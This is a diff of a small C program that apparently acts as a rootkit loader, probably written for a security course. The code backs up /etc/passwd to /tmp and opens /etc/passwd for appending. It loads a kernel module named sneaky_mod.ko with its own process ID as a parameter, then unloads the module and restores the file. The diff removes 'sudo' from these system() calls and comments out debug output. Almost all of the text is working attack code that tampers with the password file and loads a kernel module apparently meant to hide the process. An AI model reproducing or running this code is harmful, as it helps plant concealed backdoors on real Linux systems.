@@ -6,7 +6,7 @@
 
 
 void pwdswap(void) {
-  system("sudo cp /etc/passwd /tmp/passwd");
+  system("cp /etc/passwd /tmp/passwd");
   FILE * passwd = fopen("/etc/passwd", "at+");
   if (passwd == NULL) {
     perror("File Opening");
@@ -27,7 +27,7 @@ int main(void) {
   //cast PID as string
   sprintf(num, "%d", PID);
   char str[100];
-  strcpy(str, "sudo insmod sneaky_mod.ko");
+  strcpy(str, "insmod sneaky_mod.ko");
   strcat(str, " pid=");
   strcat(str, num);
 
@@ -37,8 +37,8 @@ int main(void) {
   
   //Step 2: Swap passwd files
   pwdswap();
-  printf("What etc has been changed to before we load the module!\n");
-  system("cat /etc/passwd");
+  //printf("What etc has been changed to before we load the module!\n");
+  //system("cat /etc/passwd");
 
   
   //Step 3: Load kernel module
@@ -52,13 +52,15 @@ int main(void) {
     //scanf("%c", &c);
   }
 
+  //printf("Print before REMOVAL!\n");
   //Step 5: Release kernel module 
-  system("sudo rmmod sneaky_mod.ko");
+  system("rmmod sneaky_mod.ko");
 
-
+  // printf("PRINT AFTER REMOVAL!\n");
   //Step 6: Restore /etc/passwd file
-  system("sudo cp /tmp/passwd /etc/passwd");
-  
+  system("cp /tmp/passwd /etc/passwd");
+
+  //  printf("PRINT BEFORE EXIT!\n");
   
   return EXIT_SUCCESS;
 
